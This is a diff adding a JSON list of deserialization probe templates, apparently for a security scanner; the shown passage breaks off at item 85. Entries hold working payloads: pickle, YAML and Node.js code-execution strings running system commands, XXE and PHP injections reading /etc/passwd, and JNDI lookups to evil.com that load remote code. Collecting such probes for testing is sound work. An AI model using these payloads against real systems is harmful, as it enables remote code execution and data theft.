@@ -1,0 +1,1145 @@
+[
+  {
+    "id": "deserialization-owasp-0001",
+    "name": "Java serialized object patterns",
+    "template": "rO0ABXNy",
+    "description": "Java serialized object patterns probe from OWASP. Tests application handling of: rO0ABXNy",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0002",
+    "name": "Java serialized object patterns #2",
+    "template": "aced0005",
+    "description": "Java serialized object patterns probe from OWASP. Tests application handling of: aced0005",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0003",
+    "name": "Java serialized object patterns #3",
+    "template": "H4sIAAAAAAAA",
+    "description": "Java serialized object patterns probe from OWASP. Tests application handling of: H4sIAAAAAAAA",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0004",
+    "name": "PHP serialization",
+    "template": "O:8:\"stdClass\":0:{}",
+    "description": "PHP serialization probe from OWASP. Tests application handling of: O:8:\"stdClass\":0:{}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0005",
+    "name": "PHP serialization #2",
+    "template": "a:1:{i:0;s:5:\"admin\";}",
+    "description": "PHP serialization probe from OWASP. Tests application handling of: a:1:{i:0;s:5:\"admin\";}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0006",
+    "name": "PHP serialization #3",
+    "template": "O:4:\"User\":1:{s:4:\"role\";s:5:\"admin\";}",
+    "description": "PHP serialization probe from OWASP. Tests application handling of: O:4:\"User\":1:{s:4:\"role\";s:5:\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0007",
+    "name": "PHP serialization #4",
+    "template": "O:10:\"Evil_Class\":0:{}",
+    "description": "PHP serialization probe from OWASP. Tests application handling of: O:10:\"Evil_Class\":0:{}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0008",
+    "name": "Python pickle",
+    "template": "\\x80\\x03cos",
+    "description": "Python pickle probe from OWASP. Tests application handling of: \\x80\\x03cos",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0009",
+    "name": "Python pickle #2",
+    "template": "(S'whoami'",
+    "description": "Python pickle probe from OWASP. Tests application handling of: (S'whoami'",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0010",
+    "name": "Python pickle #3",
+    "template": "tR.",
+    "description": "Python pickle probe from OWASP. Tests application handling of: tR.",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0011",
+    "name": ".NET deserialization",
+    "template": "AAEAAAD/////",
+    "description": ".NET deserialization probe from OWASP. Tests application handling of: AAEAAAD/////",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0012",
+    "name": "JSON deserialization attacks",
+    "template": "{\"@type\":\"java.net.URL\",\"val\":\"http://attacker.com\"}",
+    "description": "JSON deserialization attacks probe from OWASP. Tests application handling of: {\"@type\":\"java.net.URL\",\"val\":...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0013",
+    "name": "JSON deserialization attacks #2",
+    "template": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('calc')}()\"}",
+    "description": "JSON deserialization attacks probe from OWASP. Tests application handling of: {\"rce\":\"_$$ND_FUNC$$_function(...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0014",
+    "name": "YAML deserialization",
+    "template": "!!python/object/apply:os.system ['calc']",
+    "description": "YAML deserialization probe from OWASP. Tests application handling of: !!python/object/apply:os.syste...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0015",
+    "name": "YAML deserialization #2",
+    "template": "!!python/object/new:os.system [calc]",
+    "description": "YAML deserialization probe from OWASP. Tests application handling of: !!python/object/new:os.system ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0016",
+    "name": "XML deserialization/XXE",
+    "template": "<?xml version=\"1.0\"?>",
+    "description": "XML deserialization/XXE probe from OWASP. Tests application handling of: <?xml version=\"1.0\"?>",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0017",
+    "name": "XML deserialization/XXE #2",
+    "template": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+    "description": "XML deserialization/XXE probe from OWASP. Tests application handling of: <!DOCTYPE foo [<!ENTITY xxe SY...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0018",
+    "name": "XML deserialization/XXE #3",
+    "template": "<foo>&xxe;</foo>",
+    "description": "XML deserialization/XXE probe from OWASP. Tests application handling of: <foo>&xxe;</foo>",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0019",
+    "name": "Gadget chains (Java)",
+    "template": "CommonsCollections1",
+    "description": "Gadget chains (Java) probe from OWASP. Tests application handling of: CommonsCollections1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0020",
+    "name": "Gadget chains (Java) #2",
+    "template": "CommonsCollections2",
+    "description": "Gadget chains (Java) probe from OWASP. Tests application handling of: CommonsCollections2",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0021",
+    "name": "Gadget chains (Java) #3",
+    "template": "CommonsCollections3",
+    "description": "Gadget chains (Java) probe from OWASP. Tests application handling of: CommonsCollections3",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0022",
+    "name": "Gadget chains (Java) #4",
+    "template": "CommonsCollections4",
+    "description": "Gadget chains (Java) probe from OWASP. Tests application handling of: CommonsCollections4",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0023",
+    "name": "Gadget chains (Java) #5",
+    "template": "CommonsCollections5",
+    "description": "Gadget chains (Java) probe from OWASP. Tests application handling of: CommonsCollections5",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0024",
+    "name": "Gadget chains (Java) #6",
+    "template": "CommonsCollections6",
+    "description": "Gadget chains (Java) probe from OWASP. Tests application handling of: CommonsCollections6",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0025",
+    "name": "Gadget chains (Java) #7",
+    "template": "Groovy1",
+    "description": "Gadget chains (Java) probe from OWASP. Tests application handling of: Groovy1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0026",
+    "name": "Gadget chains (Java) #8",
+    "template": "Spring1",
+    "description": "Gadget chains (Java) probe from OWASP. Tests application handling of: Spring1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0027",
+    "name": "Gadget chains (Java) #9",
+    "template": "Spring2",
+    "description": "Gadget chains (Java) probe from OWASP. Tests application handling of: Spring2",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0028",
+    "name": "Node.js deserialization",
+    "template": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls')}()\"}",
+    "description": "Node.js deserialization probe from OWASP. Tests application handling of: {\"rce\":\"_$$ND_FUNC$$_function(...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0029",
+    "name": "Node.js deserialization #2",
+    "template": "{\"__proto__\":{\"isAdmin\":true}}",
+    "description": "Node.js deserialization probe from OWASP. Tests application handling of: {\"__proto__\":{\"isAdmin\":true}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0030",
+    "name": "Ruby Marshal",
+    "template": "\\x04\\x08o:\\x10User\\x06:\\x0arole:\\x0aadmin",
+    "description": "Ruby Marshal probe from OWASP. Tests application handling of: \\x04\\x08o:\\x10User\\x06:\\x0arol...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0031",
+    "name": "Apache Commons Collections",
+    "template": "org.apache.commons.collections.Transformer",
+    "description": "Apache Commons Collections probe from OWASP. Tests application handling of: org.apache.commons.collections...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0032",
+    "name": "Apache Commons Collections #2",
+    "template": "org.apache.commons.collections.functors.InvokerTransformer",
+    "description": "Apache Commons Collections probe from OWASP. Tests application handling of: org.apache.commons.collections...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0033",
+    "name": "Apache Commons Collections #3",
+    "template": "org.apache.commons.collections.functors.ChainedTransformer",
+    "description": "Apache Commons Collections probe from OWASP. Tests application handling of: org.apache.commons.collections...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0034",
+    "name": "Apache Commons Collections #4",
+    "template": "org.apache.commons.collections.functors.ConstantTransformer",
+    "description": "Apache Commons Collections probe from OWASP. Tests application handling of: org.apache.commons.collections...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0035",
+    "name": "Apache Commons Collections #5",
+    "template": "org.apache.commons.collections.keyvalue.TiedMapEntry",
+    "description": "Apache Commons Collections probe from OWASP. Tests application handling of: org.apache.commons.collections...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0036",
+    "name": "Apache Commons Collections #6",
+    "template": "org.apache.commons.collections.map.LazyMap",
+    "description": "Apache Commons Collections probe from OWASP. Tests application handling of: org.apache.commons.collections...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0037",
+    "name": "Spring Framework",
+    "template": "org.springframework.context.support.ClassPathXmlApplicationContext",
+    "description": "Spring Framework probe from OWASP. Tests application handling of: org.springframework.context.su...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0038",
+    "name": "Spring Framework #2",
+    "template": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
+    "description": "Spring Framework probe from OWASP. Tests application handling of: org.springframework.beans.fact...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0039",
+    "name": "C3P0",
+    "template": "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase",
+    "description": "C3P0 probe from OWASP. Tests application handling of: com.mchange.v2.c3p0.impl.PoolB...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0040",
+    "name": "C3P0 #2",
+    "template": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
+    "description": "C3P0 probe from OWASP. Tests application handling of: com.mchange.v2.c3p0.JndiRefFor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0041",
+    "name": "Hibernate",
+    "template": "org.hibernate.engine.spi.TypedValue",
+    "description": "Hibernate probe from OWASP. Tests application handling of: org.hibernate.engine.spi.Typed...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0042",
+    "name": "Hibernate #2",
+    "template": "org.hibernate.tuple.component.AbstractComponentTuplizer",
+    "description": "Hibernate probe from OWASP. Tests application handling of: org.hibernate.tuple.component....",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0043",
+    "name": "Vaadin",
+    "template": "com.vaadin.data.util.NestedMethodProperty",
+    "description": "Vaadin probe from OWASP. Tests application handling of: com.vaadin.data.util.NestedMet...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0044",
+    "name": "Vaadin #2",
+    "template": "com.vaadin.data.util.PropertysetItem",
+    "description": "Vaadin probe from OWASP. Tests application handling of: com.vaadin.data.util.Propertys...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0045",
+    "name": "Advanced PHP serialization",
+    "template": "O:8:\"stdClass\":1:{s:4:\"code\";s:10:\"phpinfo();\";}",
+    "description": "Advanced PHP serialization probe from OWASP. Tests application handling of: O:8:\"stdClass\":1:{s:4:\"code\";s...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0046",
+    "name": "Advanced PHP serialization #2",
+    "template": "O:11:\"PDOStatement\":0:{}",
+    "description": "Advanced PHP serialization probe from OWASP. Tests application handling of: O:11:\"PDOStatement\":0:{}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0047",
+    "name": "Advanced PHP serialization #3",
+    "template": "a:2:{i:0;O:8:\"stdClass\":0:{}i:1;s:5:\"admin\";}",
+    "description": "Advanced PHP serialization probe from OWASP. Tests application handling of: a:2:{i:0;O:8:\"stdClass\":0:{}i:...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0048",
+    "name": "Advanced PHP serialization #4",
+    "template": "O:12:\"SplFileObject\":1:{s:0:\"\";s:11:\"/etc/passwd\";}",
+    "description": "Advanced PHP serialization probe from OWASP. Tests application handling of: O:12:\"SplFileObject\":1:{s:0:\"\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0049",
+    "name": "PHP object injection with magic methods",
+    "template": "O:10:\"Evil_Class\":1:{s:8:\"filename\";s:11:\"/etc/passwd\";}",
+    "description": "PHP object injection with magic methods probe from OWASP. Tests application handling of: O:10:\"Evil_Class\":1:{s:8:\"file...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0050",
+    "name": "PHP object injection with magic methods #2",
+    "template": "O:4:\"User\":2:{s:2:\"id\";i:1;s:4:\"role\";s:5:\"admin\";}",
+    "description": "PHP object injection with magic methods probe from OWASP. Tests application handling of: O:4:\"User\":2:{s:2:\"id\";i:1;s:4...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0051",
+    "name": "PHP object injection with magic methods #3",
+    "template": "O:7:\"PhpCode\":1:{s:4:\"code\";s:6:\"system\";}",
+    "description": "PHP object injection with magic methods probe from OWASP. Tests application handling of: O:7:\"PhpCode\":1:{s:4:\"code\";s:...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0052",
+    "name": "Advanced Python pickle",
+    "template": "\\x80\\x03csubprocess\\ncheck_output\\n(S'ls'\\ntR.",
+    "description": "Advanced Python pickle probe from OWASP. Tests application handling of: \\x80\\x03csubprocess\\ncheck_out...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0053",
+    "name": "Advanced Python pickle #2",
+    "template": "\\x80\\x03csubprocess\\nPopen\\n(S'calc'\\ntR.",
+    "description": "Advanced Python pickle probe from OWASP. Tests application handling of: \\x80\\x03csubprocess\\nPopen\\n(S...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0054",
+    "name": "Advanced Python pickle #3",
+    "template": "\\x80\\x03cos\\nsystem\\n(S'whoami'\\ntR.",
+    "description": "Advanced Python pickle probe from OWASP. Tests application handling of: \\x80\\x03cos\\nsystem\\n(S'whoami...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0055",
+    "name": "Advanced Python pickle #4",
+    "template": "cos\\nsystem\\n(S'cat /etc/passwd'\\ntR.",
+    "description": "Advanced Python pickle probe from OWASP. Tests application handling of: cos\\nsystem\\n(S'cat /etc/passw...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0056",
+    "name": "Python pickle RCE variants",
+    "template": "c__builtin__\\neval\\n(S'__import__(\"os\").system(\"ls\")'\\ntR.",
+    "description": "Python pickle RCE variants probe from OWASP. Tests application handling of: c__builtin__\\neval\\n(S'__impor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0057",
+    "name": "Python pickle RCE variants #2",
+    "template": "\\x80\\x03c__builtin__\\nexec\\n(S'import os;os.system(\"whoami\")'\\ntR.",
+    "description": "Python pickle RCE variants probe from OWASP. Tests application handling of: \\x80\\x03c__builtin__\\nexec\\n(S...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0058",
+    "name": ".NET BinaryFormatter",
+    "template": "AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0u",
+    "description": ".NET BinaryFormatter probe from OWASP. Tests application handling of: AAEAAAD/////AQAAAAAAAAAMAgAAAE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0059",
+    "name": ".NET BinaryFormatter #2",
+    "template": "AAEAAAD/////AQAAAAAAAAAEAQAAAClT",
+    "description": ".NET BinaryFormatter probe from OWASP. Tests application handling of: AAEAAAD/////AQAAAAAAAAAEAQAAAC...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0060",
+    "name": ".NET ObjectStateFormatter",
+    "template": "/wEy",
+    "description": ".NET ObjectStateFormatter probe from OWASP. Tests application handling of: /wEy",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0061",
+    "name": ".NET SoapFormatter",
+    "template": "<SOAP-ENV:Envelope",
+    "description": ".NET SoapFormatter probe from OWASP. Tests application handling of: <SOAP-ENV:Envelope",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0062",
+    "name": "ViewState exploitation (.NET)",
+    "template": "__VIEWSTATE=/wEPDwUKLTY5NDY",
+    "description": "ViewState exploitation (.NET) probe from OWASP. Tests application handling of: __VIEWSTATE=/wEPDwUKLTY5NDY",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0063",
+    "name": "ViewState exploitation (.NET) #2",
+    "template": "__VIEWSTATEGENERATOR=CA0B0334",
+    "description": "ViewState exploitation (.NET) probe from OWASP. Tests application handling of: __VIEWSTATEGENERATOR=CA0B0334",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0064",
+    "name": "JSON deserialization with type confusion",
+    "template": "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\"}",
+    "description": "JSON deserialization with type confusion probe from OWASP. Tests application handling of: {\"$type\":\"System.Windows.Data....",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0065",
+    "name": "JSON deserialization with type confusion #2",
+    "template": "{\"__type\":\"System.IO.FileInfo\"}",
+    "description": "JSON deserialization with type confusion probe from OWASP. Tests application handling of: {\"__type\":\"System.IO.FileInfo\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0066",
+    "name": "JSON deserialization with type confusion #3",
+    "template": "{\"@class\":\"java.net.URL\",\"val\":\"http://evil.com\"}",
+    "description": "JSON deserialization with type confusion probe from OWASP. Tests application handling of: {\"@class\":\"java.net.URL\",\"val\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0067",
+    "name": "Jackson polymorphic deserialization",
+    "template": "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\",{\"url\":\"jdbc:h2:mem:\"}]",
+    "description": "Jackson polymorphic deserialization probe from OWASP. Tests application handling of: [\"ch.qos.logback.core.db.Drive...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0068",
+    "name": "Jackson polymorphic deserialization #2",
+    "template": "[\"org.apache.xbean.propertyeditor.JndiConverter\",{\"asText\":\"ldap://evil.com/\"}]",
+    "description": "Jackson polymorphic deserialization probe from OWASP. Tests application handling of: [\"org.apache.xbean.propertyedi...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0069",
+    "name": "Jackson polymorphic deserialization #3",
+    "template": "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://evil.com/\",\"autoCommit\":true}]",
+    "description": "Jackson polymorphic deserialization probe from OWASP. Tests application handling of: [\"com.sun.rowset.JdbcRowSetImp...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0070",
+    "name": "Fastjson exploitation",
+    "template": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil.com/Exploit\",\"autoCommit\":true}",
+    "description": "Fastjson exploitation probe from OWASP. Tests application handling of: {\"@type\":\"com.sun.rowset.JdbcR...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0071",
+    "name": "Fastjson exploitation #2",
+    "template": "{\"@type\":\"java.net.Inet4Address\",\"val\":\"evil.com\"}",
+    "description": "Fastjson exploitation probe from OWASP. Tests application handling of: {\"@type\":\"java.net.Inet4Addres...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0072",
+    "name": "Fastjson exploitation #3",
+    "template": "{\"@type\":\"java.net.URL\",\"val\":\"http://evil.com\"}",
+    "description": "Fastjson exploitation probe from OWASP. Tests application handling of: {\"@type\":\"java.net.URL\",\"val\":...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0073",
+    "name": "YAML deserialization (Python)",
+    "template": "!!python/object/apply:subprocess.Popen [['calc']]",
+    "description": "YAML deserialization (Python) probe from OWASP. Tests application handling of: !!python/object/apply:subproce...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0074",
+    "name": "YAML deserialization (Python) #2",
+    "template": "!!python/object/apply:os.system ['whoami']",
+    "description": "YAML deserialization (Python) probe from OWASP. Tests application handling of: !!python/object/apply:os.syste...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0075",
+    "name": "YAML deserialization (Ruby)",
+    "template": "--- !ruby/object:Gem::Installer",
+    "description": "YAML deserialization (Ruby) probe from OWASP. Tests application handling of: --- !ruby/object:Gem::Installe...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0076",
+    "name": "YAML deserialization (Ruby) #2",
+    "template": "i: x",
+    "description": "YAML deserialization (Ruby) probe from OWASP. Tests application handling of: i: x",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0077",
+    "name": "YAML deserialization (Ruby) #3",
+    "template": "--- !ruby/object:Gem::Requirement",
+    "description": "YAML deserialization (Ruby) probe from OWASP. Tests application handling of: --- !ruby/object:Gem::Requirem...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0078",
+    "name": "YAML deserialization (Ruby) #4",
+    "template": "requirements: !ruby/object:Gem::Package::TarReader",
+    "description": "YAML deserialization (Ruby) probe from OWASP. Tests application handling of: requirements: !ruby/object:Gem...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0079",
+    "name": "Node.js prototype pollution",
+    "template": "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+    "description": "Node.js prototype pollution probe from OWASP. Tests application handling of: {\"constructor\":{\"prototype\":{\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0080",
+    "name": "Node.js prototype pollution #2",
+    "template": "{\"__proto__\":{\"shell\":\"/bin/sh\"}}",
+    "description": "Node.js prototype pollution probe from OWASP. Tests application handling of: {\"__proto__\":{\"shell\":\"/bin/sh...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0081",
+    "name": "Node.js VM escape",
+    "template": "{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami').toString()}()\"}",
+    "description": "Node.js VM escape probe from OWASP. Tests application handling of: {\"rce\":\"_$$ND_FUNC$$_function(...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0082",
+    "name": "Node.js VM escape #2",
+    "template": "{\"eval\":\"_$$ND_FUNC$$_function(){return global.process.mainModule.require('child_process').execSync('id').toString()}()\"}",
+    "description": "Node.js VM escape probe from OWASP. Tests application handling of: {\"eval\":\"_$$ND_FUNC$$_function...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0083",
+    "name": "Ruby YAML deserialization",
+    "template": "--- !ruby/object:Gem::Installer\\ni: x\\n--- !ruby/object:Gem::SpecFetcher\\ni: y",
+    "description": "Ruby YAML deserialization probe from OWASP. Tests application handling of: --- !ruby/object:Gem::Installe...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0084",
+    "name": "Ruby YAML deserialization #2",
+    "template": "!ruby/object:Gem::Requirement {requirements: [[!, !ruby/object:Gem::Package::TarReader {}}]}",
+    "description": "Ruby YAML deserialization probe from OWASP. Tests application handling of: !ruby/object:Gem::Requirement ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0085",
+    "name": "Java RMI exploitation",
+    "template": "rmi://evil.com:1099/Object",
